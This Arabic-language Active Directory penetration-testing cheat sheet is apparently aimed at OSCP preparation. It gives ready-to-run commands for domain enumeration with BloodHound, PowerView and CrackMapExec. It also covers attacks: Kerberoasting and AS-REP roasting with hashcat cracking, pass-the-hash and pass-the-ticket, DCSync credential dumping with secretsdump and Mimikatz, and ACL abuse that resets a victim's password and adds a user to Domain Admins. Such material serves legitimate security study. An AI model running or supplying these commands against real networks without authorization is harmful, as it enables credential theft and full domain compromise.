


## Active Directory Enumeration - الكامل

---

## أولاً: الأدوات

### BloodHound - الأشهر

يرسم العلاقات بين اليوزرات والغروبات ويوضح Attack Paths بصرياً

powershell

```powershell
# جمع البيانات (على الجهاز المخترق)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --stealth   # أهدأ

# أو من Kali
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All
```

بعدين ترفع الـ ZIP على BloodHound GUI وتشوف الـ Attack Paths.

---

### PowerView

الأقوى للـ manual enumeration

powershell

```powershell
Import-Module .\PowerView.ps1

# Domain Info
Get-Domain
Get-DomainController

# Users
Get-DomainUser
Get-DomainUser -Identity john
Get-DomainUser | select samaccountname, description   # passwords في الـ description!

# Groups
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"

# Computers
Get-DomainComputer | select name, operatingsystem

# GPO
Get-DomainGPO
```

---

### ADPeas

مثل WinPEAS بس للـ AD

powershell

```powershell
Import-Module .\adPEAS.ps1
Invoke-adPEAS
```

---

### ldapdomaindump

من Kali بدون ما تكون على الدومين

bash

```bash
ldapdomaindump -u 'domain\user' -p 'password' <DC_IP>
```

---

## ثانياً: Manual Commands

### معلومات الدومين

powershell

```powershell
# معلومات أساسية
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
echo %USERDOMAIN%
echo %LOGONSERVER%

# Domain Controllers
nltest /dclist:domain.local
nslookup -type=SRV _ldap._tcp.domain.local
```

### Users

powershell

```powershell
# كل اليوزرات
net user /domain

# يوزر محدد
net user john /domain

# اليوزرات اللي ما تنتهي باسووردهم (خطر)
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD

# اليوزرات اللي ما يحتاجون Pre-Auth (AS-REP Roasting)
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH
```

### Groups

powershell

```powershell
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net localgroup administrators /domain
```

### Shares

powershell

```powershell
# شوف الـ shares على الشبكة
Invoke-ShareFinder
Find-DomainShare -CheckShareAccess

# يدوي
net view \\DC01
net view /domain
```

### ACLs - مهم جداً

powershell

```powershell
# من لديه صلاحيات على يوزر معين
Get-DomainObjectAcl -Identity "john" -ResolveGUIDs

# ابحث عن صلاحيات مفيدة
Find-InterestingDomainAcl -ResolveGUIDs
```

---

## ثالثاً: Attack Paths

### 1. Kerberoasting

أي يوزر عنده SPN تقدر تطلب تذكرته وتكسر الباسورد

powershell

```powershell
# اكتشاف
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# هجوم من Kali
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request

# كسر الـ hash
hashcat -m 13100 hash.txt rockyou.txt
```

---

### 2. AS-REP Roasting

يوزرات بدون Pre-Authentication تقدر تطلب hash بدون باسورد

powershell

```powershell
# اكتشاف
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH

# هجوم من Kali (بدون باسورد!)
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC_IP>

# كسر
hashcat -m 18200 hash.txt rockyou.txt
```

---

### 3. Pass the Hash

لو حصلت على NTLM hash ما تحتاج تكسره

bash

```bash
impacket-psexec domain/user@<IP> -hashes :NTLM_HASH
evil-winrm -i <IP> -u user -H NTLM_HASH
crackmapexec smb <IP> -u user -H NTLM_HASH
```

---

### 4. Pass the Ticket (Kerberos)

bash

```bash
# اسحب الـ tickets
.\Rubeus.exe dump

# استخدمها
.\Rubeus.exe ptt /ticket:base64ticket
```

---

### 5. DCSync - لو عندك صلاحيات كافية

تطلب من DC يرسلك الـ hashes كلها

bash

```bash
# من Kali
impacket-secretsdump domain/user:pass@<DC_IP>

# أو Mimikatz
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

### 6. ACL Attacks

powershell

````powershell
# لو عندك GenericAll على يوزر
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# لو عندك GenericAll على غروب
Add-DomainGroupMember -Identity "Domain Admins" -Members john
```

---

## الترتيب المنصوح للـ OSCP
```
1. BloodHound          ← أول شي، يعطيك الصورة الكاملة
2. PowerView           ← تعمق في النتائج
3. Kerberoasting       ← سهل وشائع
4. AS-REP Roasting     ← سهل جداً
5. ACL Attacks         ← BloodHound يوضحها
6. DCSync              ← آخر مرحلة بعد ما تاخذ صلاحيات
````

---

## أدوات من Kali (بدون ما تكون على الدومين)

bash

```bash
# CrackMapExec - سكنر شامل
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups

# enum4linux
enum4linux -a <IP>

# ldapsearch
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local"
```












